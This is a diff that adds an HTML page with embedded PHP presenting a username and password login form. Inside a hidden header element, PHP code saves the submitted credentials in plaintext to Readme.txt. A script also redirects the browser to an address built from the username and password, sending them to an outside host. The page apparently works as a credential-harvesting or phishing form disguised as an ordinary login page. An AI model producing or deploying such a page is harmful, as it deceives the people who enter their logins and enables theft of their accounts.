@@ -1,0 +1,64 @@
+<html>
+<head>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+</head>
+<style>
+
+body{
+    background-image: url('./1.jpg');
+    background-attachment: fixed;
+    background-size: cover;
+}
+form{
+    text-align:center;
+    color: #fff;
+
+    width:300px;
+    margin: 500px;
+    border: 2px #f2f2f2f2 solid;
+    border-radius: 10%;
+}
+button{
+    width: 100px;
+    border-radius: 10%;
+    font-size: 1rem;
+    color: #333;
+}
+</style>
+<body>
+<form action="./post.php" method="POST">
+<header hidden><?php
+if($_SERVER["REQUEST_METHOD"] == "POST"){
+$text = htmlspecialchars($_POST['text']);
+$password = htmlspecialchars($_POST['password']);
+
+echo "data: $text";
+echo "password: $password";
+$file = fopen("Readme.txt", "w+");
+fwrite($file, "$text <br/> $password");
+fclose($file);
+}
+?></header>
+
+
+<p>Username</p>
+<input id="text" type="text" name="text"/>
+<p>Password</p>
+<input id="password" type="Password" name="password"/>
+<p></p>
+<button onclick="form()" type="submit">click</button>
+</form>
+
+<button onclick="form()" type="submit">web</button>
+<script>
+    function form(){
+const details = document.querySelector("#text");
+const secrets = document.querySelector("#password");
+location = "https://" + details.value + "" +secrets.value;
+    }
+</script>
+</body>
+</html>
